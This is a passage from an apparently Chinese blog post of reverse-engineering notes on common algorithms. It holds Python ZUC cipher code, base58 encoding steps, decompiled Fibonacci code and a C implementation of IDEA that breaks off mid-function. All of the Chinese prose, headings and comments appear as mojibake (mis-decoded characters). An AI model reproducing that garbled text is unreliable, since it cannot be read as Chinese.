class="hljs-number">5</span>] &gt;&gt; <span class="hljs-number">15</span>)<br>        self.x[<span class="hljs-number">3</span>] = ((self.lfsr[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_next</span>(<span class="hljs-params">self</span>):<br>        f = self.lfsr[<span class="hljs-number">0</span>]<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">0</span>], <span class="hljs-number">8</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">4</span>], <span class="hljs-number">20</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">10</span>], <span class="hljs-number">21</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">13</span>], <span class="hljs-number">17</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">15</span>], <span class="hljs-number">15</span>)<br>        f = addition_uint31(f, v)<br>        <span class="hljs-keyword">return</span> f<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_append</span>(<span class="hljs-params">self, f</span>):<br>        self.lfsr.append(f)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.lfsr) &gt; <span class="hljs-number">16</span>:<br>            self.lfsr.pop(<span class="hljs-number">0</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_init</span>(<span class="hljs-params">self, u</span>):<br>        self.lfsr_append(addition_uint31(self.lfsr_next(), u))<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_shift</span>(<span class="hljs-params">self</span>):<br>        self.lfsr_append(self.lfsr_next())<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">self</span>):<br>        W = ((self.x[<span class="hljs-number">0</span>] ^ self.r[<span class="hljs-number">0</span>]) + self.r[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>        W1 = (self.r[<span class="hljs-number">0</span>] + self.x[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>        W2 = self.r[<span class="hljs-number">1</span>] ^ self.x[<span class="hljs-number">2</span>]<br>        u = l1(((W1 &amp; <span class="hljs-number">0x0000ffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | (W2 &gt;&gt; <span class="hljs-number">16</span>))<br>        v = l2(((W2 &amp; <span class="hljs-number">0x0000ffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | (W1 &gt;&gt; <span class="hljs-number">16</span>))<br>        self.r = [make_uint32(S0[u &gt;&gt; <span class="hljs-number">24</span>], S1[(u &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>],<br>                              S0[(u &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>], S1[u &amp; <span class="hljs-number">0xFF</span>]),<br>                  make_uint32(S0[v &gt;&gt; <span class="hljs-number">24</span>], S1[(v &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>],<br>                              S0[(v &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>], S1[v &amp; <span class="hljs-number">0xFF</span>])]<br>        <span class="hljs-keyword">return</span> W<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_init</span>(<span class="hljs-params">self, key, iv</span>):<br>        <span class="hljs-comment"># Expand key.</span><br>        self.lfsr = [make_uint31(key[i], D[i], iv[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>        self.r = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            self.bit_reorganization()<br>            w = self.f()<br>            self.lfsr_init(w &gt;&gt; <span class="hljs-number">1</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_generate_keystream</span>(<span class="hljs-params">self, length</span>):<br>        keystream_buffer = []<br>        self.bit_reorganization()<br>        self.f()  <span class="hljs-comment"># Discard the output of F.</span><br> <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">itor</span>():<br>            self.lfsr_shift()<br>            self.bit_reorganization()<br>            <span class="hljs-keyword">return</span> self.f() ^ self.x[-<span class="hljs-number">1</span>]<br> <br>        keystream_buffer = [itor() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)]<br>        self.lfsr_shift()<br>        <span class="hljs-keyword">return</span> keystream_buffer<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">zuc_encrypt</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span></span>):<br>        length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>)<br>        key_stream = self.zuc_generate_keystream(length)<br>        <span class="hljs-keyword">return</span> [inp ^ key_stream[i] <span class="hljs-keyword">for</span> i, inp <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">input</span>)]<br> <br> <br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;__main__&#x27;</span> == __name__:<br>    key = [<span class="hljs-number">0x00</span>] * <span class="hljs-number">16</span><br>    iv = [<span class="hljs-number">0x00</span>] * <span class="hljs-number">16</span><br>    zuc = ZUC(key, iv)<br>    <span class="hljs-comment"># åŠ å¯†è¿‡ç¨‹</span><br>    out = zuc.zuc_encrypt(<span class="hljs-string">b&quot;i love u&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åŠ å¯†å¾—åˆ°çš„å­—æµ&quot;</span>, [<span class="hljs-string">&quot;%08x&quot;</span> % e <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> out])<br>    <span class="hljs-comment"># è§£å¯†è¿‡ç¨‹</span><br>    zuc2 = ZUC(key, iv)<br>    out2 = zuc2.zuc_encrypt(out)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†å¾—åˆ°çš„å­—æµ&quot;</span>, [<span class="hljs-string">&quot;%08x&quot;</span> % e <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> out2])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(out2))<br></code></pre></td></tr></table></figure><h1 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h1><p>åŸºæœ¬æ€æƒ³ï¼šå¸¸â½¤çš„å­—èŠ‚ç ï¼ˆ256è¿›åˆ¶ï¼‰è½¬æ¢æˆBase58ï¼Œç›¸å½“äºå°†256è¿›åˆ¶è½¬æ¢æˆ58è¿›åˆ¶</p><p>ç»å…¸è„šæœ¬ï¼Œè¡¨çš„é•¿åº¦æ˜¯61ï¼Œ1-9+å¤§å°å†™å­—æ¯ï¼Œä¸€èˆ¬ä¼šå¤šæ¬¡å‡ºç°58</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103498182-3d0c05cf-4c62-4494-bbc2-b27a572b65a5.png" class="" title="img"><p>ä¹Ÿæœ‰è¿™æ ·çš„</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1725501074874-fc0b4761-a24b-4adc-afc3-f4b0b6a3c249.png" class="" title="img"><p>ç¼–ç è¿‡ç¨‹æ˜¯ï¼š</p><p>\1. å°†è¦è½¬æ¢çš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</p><p>\2. è®¡ç®—å‰ç½®å­—èŠ‚ç æ˜¯0çš„ä¸ªæ•°ï¼Œå› ä¸º0æ²¡å¿…è¦å‚ä¸è½¬æ¢ï¼Œå…¶ç»“æœæ˜¯0ã€‚</p><p>\3. å°†256è¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶</p><p>\4. å°†10è¿›åˆ¶è½¬æ¢ä¸º58è¿›åˆ¶ã€‚</p><p>\5. å¾—åˆ°â¼€ä¸ª58è¿›åˆ¶çš„æ•°ç»„ï¼Œå°†ç¬¬â¼†æ­¥0çš„ä¸ªæ•°æ·»åŠ åˆ°è¯¥æ•°ç»„æœ«å°¾ã€‚nä¸ª0å°±æ·»åŠ nä¸ª0åˆ°æ•°ç»„æœ«å°¾ã€‚</p><p>\6. åè½¬æ•´ä¸ªæ•°ç»„ã€‚</p><p>\7. æŸ¥è¡¨ï¼Œå°†base58ç¼–ç è½¬æ¢æˆå­—ç¬¦ã€‚</p><p>è¿™â¾¥çš„ç¬¬3æ­¥å¦‚æœè½¬æ¢çš„å­—èŠ‚æ•°ç»„å¾ˆâ»“ï¼Œé‚£ä¹ˆä»¥256ä¸ºåº•æ•°çš„æŒ‡æ•°å°†ä¼šâ¾®å¸¸åºâ¼¤ï¼Œéœ€è¦ä½¿â½¤â¼¤æ•°ï¼Œä½†å®é™…ä¸Šå¯ä»¥ä¼˜åŒ–ç®—æ³•ï¼Œæ²¡å¿…è¦â¼€æ¬¡æ€§å°†æ•´ä¸ªåŸå§‹æ•°ç»„å…¨éƒ¨è½¬æ¢ä¸º10è¿›åˆ¶åæ‰è½¬æ¢ä¸º58è¿›åˆ¶ï¼Œå¯é‡‡å–é€ä¸ªè½¬æ¢ä¸º58è¿›åˆ¶çš„ç­–ç•¥æ¥è¿›â¾ï¼Œè¿™æ ·å¯ä»¥é¿å…ä½¿â½¤â¼¤æ•´æ•°ï¼Œä»â½½æâ¾¼è¿ç®—æ•ˆç‡ã€‚</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103402878-be9876fd-04a6-4b39-a984-52ab209107e4.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103416136-af46dec2-60b8-4619-aa55-f6cadad1bd36.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103463789-7bf66485-cad1-4bf6-a032-39ce1dc72964.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706103475369-340dd3c5-c871-4c84-bedd-50d61dc77bf7.png" class="" title="img"><p>base58ä¸éœ€è¦keyä¹Ÿèƒ½è§£å‡ºæ¥</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706107904227-c3a6d88e-7b48-4070-bd1c-5465956dc73e.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706107881056-e7eac23e-dab4-4df1-b478-42c4ffd3a376.png" class="" title="img"><h1 id="æ–æ³¢é‚£å¥‘æ•°åˆ—"><a href="#æ–æ³¢é‚£å¥‘æ•°åˆ—" class="headerlink" title="æ–æ³¢é‚£å¥‘æ•°åˆ—"></a><strong>æ–æ³¢é‚£å¥‘æ•°åˆ—</strong></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = fib_start;<br>v2 = &amp;xmmword_408040;<br>xmmword_408040 = (__int128)_mm_load_si128((<span class="hljs-type">const</span> __m128i *)&amp;xmmword_405050);<br>v3 = dword_404010 + <span class="hljs-number">4</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>  v4 = v1;<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    v12 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = <span class="hljs-number">0</span>;<br>    v6 = <span class="hljs-number">0</span>;<br>    v7 = <span class="hljs-number">1</span>;<br>    v8 = <span class="hljs-number">1</span>;<br>    v9 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      &#123;<br>        v10 = v6;<br>        v6 = v7 * v8 + v5 * v6;<br>        v8 = v7 * v10 + v9 * v8;<br>      &#125;<br>      v11 = v7 * v7;<br>      v7 *= v5 + v9;<br>      v5 = v11 + v5 * v5;<br>      v4 &gt;&gt;= <span class="hljs-number">1</span>;<br>      v9 = v9 * v9 + v11;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v4 );<br>    v12 = v8;<br>  &#125;<br>  ++v1;<br>  *(_DWORD *)v2 = v12;<br>  v2 = (__int128 *)((<span class="hljs-type">char</span> *)v2 + <span class="hljs-number">4</span>);<br>&#125;<br><span class="hljs-keyword">while</span> ( v1 != v3 );<br></code></pre></td></tr></table></figure><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p>å›½é™…æ•°æ®åŠ å¯†ç®—æ³•</p><p>IDEAæ˜¯å—åŠ å¯†ï¼Œä¸DESä¸€æ ·ï¼ŒIDEAä¹Ÿå¤„ç†64ä½æ˜æ–‡å—ï¼Œä½†æ˜¯å…¶å¯†é’¥æœ‰128ä½ï¼ŒIDEAä¹Ÿç”¨æ‰©å±•ä¸æ··æ·†è¿›è¡ŒåŠ å¯†</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721799956770-becace1d-55fb-472a-b818-fbd656562907.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721800105335-3a90d6e8-abb9-4ff4-83a7-72424adfddd0.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721800125836-0324cd07-7174-40b2-93bd-d6a3e21527e5.png" class="" title="img"><p>èƒ½çœ‹åˆ°0xffffï¼Œè¿˜æœ‰65537ï¼Œè¿˜æœ‰åŠ ï¼Œå¼‚æˆ–çš„è¿ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint32_t</span> <span class="hljs-type">uint32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__int32_t</span> <span class="hljs-type">int32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">__uint16_t</span> <span class="hljs-type">uint16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*idea_gen_key)</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span>[<span class="hljs-number">8</span>])</span>;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">mulMod65537</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> a, <span class="hljs-type">uint16_t</span> b)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> c;<br>    <span class="hljs-type">uint16_t</span> hi, lo;<br><br>    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -b + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -a + <span class="hljs-number">1</span>;<br><br>    c = (<span class="hljs-type">uint32_t</span>)a * (<span class="hljs-type">uint32_t</span>)b;<br>    hi = c &gt;&gt; <span class="hljs-number">16</span>;<br>    lo = c;<br><br>    <span class="hljs-keyword">if</span> (lo &gt; hi)<br>        <span class="hljs-keyword">return</span> lo - hi;<br>    <span class="hljs-keyword">return</span> lo - hi + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">modInverse</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-type">int</span> m0 = m, t, q;<br>    <span class="hljs-type">int</span> x0 = <span class="hljs-number">0</span>, x1 = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (m == <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (a &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// q is quotient</span><br>        q = a / m;<br>        t = m;<br><br>        <span class="hljs-comment">// m is remainder now, process same as</span><br>        <span class="hljs-comment">// Euclid&#x27;s algo</span><br>        m = a % m;<br>        a = t;<br><br>        t = x0;<br>        x0 = x1 - q * x0;<br>        x1 = t;<br>    &#125;<br><br>    <span class="hljs-comment">// Make x1 positive</span><br>    <span class="hljs-keyword">if</span> (x1 &lt; <span class="hljs-number">0</span>)<br>        x1 += m0;<br><br>    <span class="hljs-keyword">return</span> x1;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-comment">// Generate encryption keys</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">52</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">8</span>)<br>            subKey[i] = key[i];<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">6</span>)<br>            subKey[i] = (subKey[i - <span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">14</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">7</span>)<br>            subKey[i] = (subKey[i - <span class="hljs-number">15</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">14</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">else</span><br>            subKey[i] = (subKey[i - <span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">9</span>) | (subKey[i - <span class="hljs-number">6</span>] &gt;&gt; <span class="hljs-number">7</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> K[<span class="hljs-number">52</span>];<br><br>    <span class="hljs-comment">// Compute encryption keys</span><br>    encrypt(K, key);<br><br>    <span class="hljs-comment">// Generate dencryption keys</span><br>    subKey[<span class="hljs-number">0</span>] = modInverse(K[<span class="hljs-number">48</span>], <span class="hljs-number">65537</span>);<br>    subKey[<span class="hljs-number">1</span>] = -K[<span class="hljs-number">49</span>];<br>    subKey[<span class="hljs-number">2</span>] = -K[<span class="hljs-number">50</span>];<br>    subKey[<span class="hljs-number">3</span>] = modInverse(K[<span class="hljs-number">51</span>], <span class="hljs-number">65537</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Keys: %04X %04X %04X %04Xn&quot;</span>, subKey[<span class="hljs-number">0</span>], subKey[<span class="hljs-number">1</span>], subKey[<span class="hljs-number">2</span>],<br>         subKey[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">4</span>; i &lt; <span class="hljs-number">52</span>; i += <span class="hljs-number">6</span>) &#123;<br>        subKey[i + <span class="hljs-number">0</span>] = K[<span class="hljs-number">52</span> - i - <span class="hljs-number">2</span>];<br>        subKey[i + <span class="hljs-number">1</span>] = K[<span class="hljs-number">52</span> - i - <span class="hljs-number">1</span>];<br><br>        subKey[i + <span class="hljs-number">2</span>] = modInverse(K[<span class="hljs-number">52</span> - i - <span class="hljs-number">6</span>], <span class="hljs-number">65537</span>);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">46</span>) &#123;<br>            subKey[i + <span class="hljs-number">3</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">5</span>];<br>            subKey[i + <span class="hljs-number">4</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">4</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            subKey[i + <span class="hljs-number">3</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">4</span>];<br>            subKey[i + <span class="hljs-number">4</span>] = -K[<span class="hljs-number">52</span> - i - <span class="hljs-number">5</span>];<br>        &#125;<br>        subKey[i + <span class="hljs-number">5</span>] = modInverse(K[<span class="hljs-number">52</span> - i - <span class="hljs-number">3</span>], <span class="hljs-number">65537</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Keys: %04X %04X %04X %04X %04X %04Xn&quot;</span>, subKey[i], subKey[i + <span class="hljs-number">1</span>],<br>           subKey[i + <span class="hljs-number">2</span>], subKey[i + <span class="hljs-number">3</span>], subKey[i + <span class="hljs-number">4</span>], subKey[i + <span class="hljs-number">5</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">IDEA</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> data[<span class="hljs-number">4</span>], <span class="hljs-type">uint16_t</span> key[<span class="hljs-number">8</span>], idea_gen_key func)</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> subKey[<span class="hljs-number">52</span>];<br><br>    <span class="hljs-comment">// Generate keys</span><br>    func(subKey, key);<br><br>    <span class="hljs-type">uint16_t</span> X0 = data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint16_t</span> X1 = data[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint16_t</span> X2 = data[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">uint16_t</span> X3 = data[<span class="hljs-number">3</span>];<br>    <span class="hljs-type">uint16_t</span> tmp1, tmp2;<br><br>    <span class="hljs-comment">// Apply 8 rounds</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d:   %04X %04X %04X %04Xn&quot;</span>, i, X0, X1, X2, X3);<br><br>        X0 = mulMod65537(X0, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">0</span>]);  <span class="hljs-comment">// Step 1</span><br>        X1 += subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">1</span>];                  <span class="hljs-comment">// Step 2</span><br>        X2 += subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">2</span>];                  <span class="hljs-comment">// Step 3</span><br>        X3 = mulMod65537(X3, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">3</span>]);  <span class="hljs-comment">// Step 4</span><br><br>        tmp1 = X0 ^ X2;  <span class="hljs-comment">// Step 5</span><br>        tmp2 = X1 ^ X3;  <span class="hljs-comment">// Step 6</span><br><br>        tmp1 = mulMod65537(tmp1, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">4</span>]);  <span class="hljs-comment">// Step 7</span><br>        tmp2 += tmp1;                                 <span class="hljs-comment">// Step 8</span><br>        tmp2 = mulMod65537(tmp2, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">5</span>]);  <span class="hljs-comment">// Step 